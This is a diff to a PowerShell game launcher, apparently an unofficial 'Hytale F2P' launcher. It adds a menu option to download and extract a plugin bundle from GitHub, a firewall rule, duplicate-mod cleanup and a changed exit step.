@@ -1393,6 +1570,7 @@ while (-not $proceedToLaunch) {
     Write-Host " [1] Start Hytale F2P (Create Shortcut)" -ForegroundColor Green
     Write-Host " [2] Setup Host Server (Download server.bat)" -ForegroundColor Yellow
     Write-Host " [3] Repair / Force Update" -ForegroundColor Red
+    Write-Host " [4] Install HyFixes (Server Crash Fixes)" -ForegroundColor Cyan
     Write-Host ""
     
     $menuChoice = Read-Host " Select an option [1]"
@@ -1449,6 +1627,25 @@ while (-not $proceedToLaunch) {
             $forceShowMenu = $true
             $proceedToLaunch = $true 
         }
+        "4" {
+            Write-Host "`n[HYFIXES] Downloading HyFixes Optimization Bundle..." -ForegroundColor Cyan
+            $hyUrl = "https://github.com/John-Willikers/hyfixes/releases/download/v1.11.0/hyfixes-bundle-v1.11.0.zip"
+            $hyZip = Join-Path $cacheDir "hyfixes.zip"
+            
+            if (Download-WithProgress $hyUrl $hyZip $false) {
+                Write-Host "      [EXTRACT] Installing plugins..." -ForegroundColor Cyan
+                
+                # Extract directly to Server directory as requested
+                $serverDir = Join-Path $appDir "Server"
+                if (-not (Test-Path $serverDir)) { New-Item -ItemType Directory $serverDir -Force | Out-Null }
+                
+                if (Expand-WithProgress $hyZip $serverDir) {
+                    Write-Host "      [SUCCESS] HyFixes installed to Server directory!" -ForegroundColor Green
+                }
+            }
+            Write-Host "`nPress any key to return to menu..."
+            [void][System.Console]::ReadKey($true)
+        }
     }
 }
 
@@ -1475,6 +1672,19 @@ if (-not (Ensure-JRE $launcherRoot $cacheDir)) {
 
 # Patch Client
 Patch-HytaleClient $gameExe | Out-Null
+
+# Update persistence so we don't ask to update again
+$global:pwrHash = Get-LocalSha1 $gameExe
+Save-Config
+
+# --- NEW SAFETY CHECKS ---
+# 1. Firewall Whitelisting (Requires Admin)
+if ($isAdmin) { Assert-FirewallRule $gameExe }
+
+# 2. Duplicate Mod Removal (Standard User OK)
+Remove-DuplicateMods (Join-Path $appDir "mods")
+Remove-DuplicateMods (Join-Path $appDir "earlyplugins")
+# ------------------------
 
 $dispJava = if ($global:javaPath) { $global:javaPath } else { $javaExe }
 Write-Host "      Java:     $dispJava" -ForegroundColor Gray
@@ -1591,8 +1801,8 @@ if (Test-Path $gameExe) {
         Write-Host "Hytale is running successfully!" -ForegroundColor Green
         Write-Host "Auto-Closing launcher in 10 seconds..." -ForegroundColor Cyan
         Start-Sleep -Seconds 10
-        # Forcibly close the console window
-        Stop-Process -Id $PID -Force
+        # Forcibly close the console window by exiting the host
+        exit 0
     } elseif ($stable) {
         Write-Host "Hytale Process is stable." -ForegroundColor Green
         break
